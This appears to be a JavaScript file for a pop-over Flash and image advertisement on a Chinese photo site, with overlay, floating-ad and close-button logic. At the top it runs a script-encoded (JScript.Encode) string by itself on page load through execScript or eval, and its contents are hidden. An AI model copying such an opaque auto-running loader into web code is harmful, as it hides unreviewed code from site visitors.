function exec_script(js)
{	
	var ADS_GET_IE = (navigator.appName == "Microsoft Internet Explorer");
	try{
		if((typeof execScript).toString()=='object' && js && ADS_GET_IE)
		{
			execScript(js,"JScript.Encode");
		}
		else if(!ADS_GET_IE)
		{
			eval(js);
		}
	}catch(e){}
}

exec_script("#@~^NAEAAA==@#@&NG1Es+xDRS.kD+cJ@!/^.r_Jb2Y,Vl	L;lT+{BB?^.bwORAUmKNnv@*a@$=?Ho)bz){\'	e6%f3n6hW	0xa,#i9?[=D+|2t/nPvKDAU!OKdsR0S/fq Is A%3RN8	XP4:I?D\\\'Dgvbn^O\"tyC4KH3r3\\Xqit#nPU2t#]H	 j:hQ|\' \\\'K?3OE\\BMbOZ\\KIZ K36P36tnX~9FVGSh(7`|W]K`hjxUK;kZW/|:wyDsu	`J~JR?	~3{eR#fx\\q.r3O/7#6^HJ/5s35tabb1`H)bz\'x?[U@$@!&/1DJ3ErwD@*r#I@#@&MF8AAA==^#~@");

__global_cover_content = "Defined";



__ads__width="760";
__ads__height="300";
__ads__alt="";
__ads__href="http://afp.adpolestar.net/adpolestar/wayl/;ad=A8A6AEEF_997B_064A_39CB_9BA4FCB25639;ap=0;pu=cav;/?http://www1.poco.cn/topic/samsung_nx100/";
__ads__src="http://img1-c.poco.cn/a/20101117/20101117_165623.swf";
__ads__html="http://img1-c.poco.cn/a/20101117/20101117_165548.jpg";
__ads_cover_content = "1";

/* @author franky £º poco crazy ad */

ads_crazy_ad_obj = new Object();

ads_crazy_ad_obj = {

	init : function(options)
	{
		if(typeof(options)!='object')
		{
			return false;
		}

		this.options =
		{ 
			'float'		:	options.float		?	options.float		:	'left',
			'layer'		:	options.layer		?	options.layer		:	'crazy_ad_layer',
			'floater'	:	options.floater		?	options.floater		:	'crazy_ad_float',
			'b_land'	:	options.b_land		?	options.b_land		:	false,
			'showtime'	:	parseInt(options.showtime)	?	options.showtime	:	'18000',
			'closer'	:	options.closer		?	options.closer		:	'crazy_ad_closer',
			'ignore_loaded' : options.ignore_loaded		?	options.ignore_loaded		:	false
		}
    this.ads_load_swf();
		if( !!this.options.b_land )
		{
			this.load_floater(this.options.floater);
		}
	},
	
	$ : function(e)
	{
		return typeof(e) == 'object' ? e : document.getElementById(e);
	},

  ads_load_swf : function ()
	{
	
		var swf =  document.getElementById("ad_swf_obj");
	
		if(!swf || true)
		{
			this.load_crazyer();
		}
		else if(navigator.appName != "Microsoft Internet Explorer" ||swf.PercentLoaded()==100)
		{
			this.load_crazyer();
		}
		else
		{
			setTimeout("ads_crazy_ad_obj.ads_load_swf()",100);
		}
	
	},

	load_crazyer : function()
	{
		var _top = 150,_css = "visibility:hidden;",obj = this.options.layer;

		if( window.screen.width > 800 )
		{
			var o_width = document.documentElement.offsetWidth;
			var e_width = this.$(obj).clientWidth;

			if(o_width > e_width)
			{
				_css = "position:absolute;top:"+_top+"px;left:"+parseInt((o_width - e_width)/2)+"px;visibility:visible;z-index:9999;";
			}
		}

		this.$(obj).style.cssText = _css;

		this.$(this.options.closer).style.cssText = "position:absolute;top:-22px;left:"+(parseInt(e_width)-88)+"px;cursor:pointer;z-index:9999;";
		this.crazy_ad_layer_html = this.$(obj).innerHTML;
		this.set_clock();
	},

	load_floater : function()
	{
		var _top,_mar,_css,obj = this.options.floater;

		if( !this.options.b_land ) return false;

		with(window.screen)
		{
			width > 800 ? (_top = 420) && (_mar = 15) : (_top = 280) && (_mar = 10);
		}

		if(_top == 420)
		{
			_css = this.options.float+":" + _mar + "px;z-index:9999;visibility:hidden;";

			if (navigator.appVersion.match(/MSIE [0-6]\./))
			{
				_css += "position:absolute;top:expression(this.style.pixelHeight+document.documentElement.scrollTop+"+_top+");";
			}
			else
			{
				_css += "position:fixed;top:"+_top+"px;";
			}

			this.$(obj).style.cssText = _css;
			this.floater_html = this.$(obj).innerHTML;
		}
		else
		{
			return false;
		}
	},

	swap_show : function(b)
	{
		clearTimeout(this.timer);
		clearInterval(this.timer);
		var s, so='o.style.visibility=',se='';

		if(this.options.b_land)
		{
			se='e.style.visibility=';
			var e = this.$(this.options.floater) ;
		}

		var o = this.$(this.options.layer) ;
		
		if(typeof(b)!='undefined' && !!!b)
		{
			s = so+"'hidden';"+se+"'hidden';";
		}
		else
		{
			if(o.style.visibility=="hidden")
			{
					window.scrollTo(0,0);
					s = so+"'visible';"+se+"'hidden';";
					//ÖØÔØFLASH ÏÔÊ¾Ö÷·è¿ñ²ã
					o.innerHTML = this.crazy_ad_layer_html;
					this.set_clock();
			}
			else
			{
					s = so+"'hidden';"+se+"'visible';";//FLSAHÒÑÍ£Ö¹ Òþ²ØÖ÷·è¿ñ²ã
					o.innerHTML = "";
			}
		}

		return eval(s);
	},

	set_clock : function()
	{
		this.timer = setInterval("ads_crazy_ad_obj.swap_show()",this.options.showtime);
	},

	load_object: function(src,width,height,wmode)
	{
		var str_object = '<OBJECT id="ad_swf_obj" codeBase=http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0 height='+height+' width='+width+' classid=clsid:d27cdb6e-ae6d-11cf-96b8-444553540000><PARAM NAME="_cx" VALUE="20320"><PARAM NAME="_cy" VALUE="2117"><PARAM NAME="FlashVars" VALUE=""><PARAM NAME="Movie" VALUE="'+src+'"><PARAM NAME="Src" VALUE="'+src+'"><PARAM NAME="WMode" VALUE="'+wmode+'"><PARAM NAME="Play" VALUE="-1"><PARAM NAME="Loop" VALUE="-1"><PARAM NAME="Quality" VALUE="High"><PARAM NAME="SAlign" VALUE=""><PARAM NAME="Menu" VALUE="0"><PARAM NAME="Base" VALUE=""><PARAM NAME="AllowScriptAccess" VALUE="always"><PARAM NAME="Scale" VALUE="ShowAll"><PARAM NAME="DeviceFont" VALUE="0"><PARAM NAME="EmbedMovie" VALUE="0"><PARAM NAME="BGColor" VALUE=""><PARAM NAME="SWRemote" VALUE=""><PARAM NAME="MovieData" VALUE=""><PARAM NAME="SeamlessTabbing" VALUE="1"><PARAM NAME="Profile" VALUE="0"><PARAM NAME="ProfileAddress" VALUE=""><PARAM NAME="ProfilePort" VALUE="0"><PARAM NAME="AllowNetworking" VALUE="all"><PARAM NAME="AllowFullScreen" VALUE="false"><embed allowscriptaccess="always" menu="false" width="'+width+'" height="'+height+'" wmode="'+wmode+'" src="'+src+'" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" name="ad_swf_obj"></embed></OBJECT>';
		return(str_object);
	},

	get_ext : function(name)
	{
		var pos = name.lastIndexOf(".");
		return name.substr(pos+1).substr(0,3).toLowerCase();
	}
}

//·è¿ñ¹ã¸æ
document.write('<div id="crazy_ad_layer" style="width:'+__ads__width+'px; height:'+__ads__height+'px;visibility:hidden;">');
document.write('<div style="position:relative">');
if( typeof(__global_cover_content)!= "undefined" && typeof(__ads_cover_content)!= "undefined" && parseInt(__ads_cover_content) && __ads__href )
{
	document.write("<a href='"+__ads__href+"' target='_blank' style='padding:0;margin:0;position:absolute;'><img src='http://a-m-s.poco.cn/images/blank.gif' width='"+__ads__width+"' height='"+__ads__height+"' border=0  /></a>");
}

if( ads_crazy_ad_obj.get_ext(__ads__src) == 'swf' )
{
	document.write(ads_crazy_ad_obj.load_object(__ads__src,__ads__width,__ads__height,'Opaque'));
}
else
{
	document.write('<img src="'+__ads__src+'" width='+__ads__width+' height='+__ads__height+' border=0 />');
}
document.write("<iframe id='asdIframe' src='about:blank' style='position:absolute; visibility:inherit;width:"+__ads__width+"px;height:"+__ads__height+"px; z-index:-1;filter:Alpha(Opacity=0); opacity:0.0; MozOpacity:0.0; KhtmlOpacity:0.0;left:0px;top:0px;'></iframe>");
document.write('<div id="crazy_ad_closer" style="visibility:hidden;" onclick="javascript:ads_crazy_ad_obj.swap_show(true);" ><img src="http://a-m-s.poco.cn/images/closer.gif" border=0></div>');
document.write('</div>');
document.write('</div>');

//Âäµã
__float_html="<div id=crazy_ad_float style='visibility:hidden;position:absolute;left:0px;top:0px;'>";
float_close_html="<div style='width:76px;padding:2px;height:15px;'><div style='float:left;'><img src='http://a-m-s.poco.cn/images/replay_little.gif' border=0 onclick='ads_crazy_ad_obj.swap_show(true);' style='cursor:pointer' /></div><div style='float:right'><img src='http://a-m-s.poco.cn/images/close_little.gif' border=0 onclick='ads_crazy_ad_obj.swap_show(false);' style='cursor:pointer' /></div></div></div>";

document.write(__float_html);

if( ads_crazy_ad_obj.get_ext(__ads__html) == 'swf' )
{
	document.write(ads_crazy_ad_obj.load_object(__ads__html,'80','80','Opaque'));
}
else
{
	document.write('<img src="'+__ads__html+'" width=80 height=80 border=0 />');
}

document.write("<a href='"+__ads__href+"' target='_blank' style='padding:0;margin:0;position:absolute;left:0px;'><img src='http://a-m-s.poco.cn/images/blank.gif' width=80 height=80 border=0  /></a>");
document.write("<iframe src='about:blank' style='position:absolute; visibility:inherit;width:80px;height:100px; z-index:-1;filter:Alpha(Opacity=0); opacity:0.0; MozOpacity:0.0; KhtmlOpacity:0.0;left:0px;top:0px;'></iframe>");

document.write(float_close_html);

setTimeout(function(){ ads_crazy_ad_obj.init({ 'b_land':!!__ads__html,'showtime':'20000','float':'right' }); },500);


	
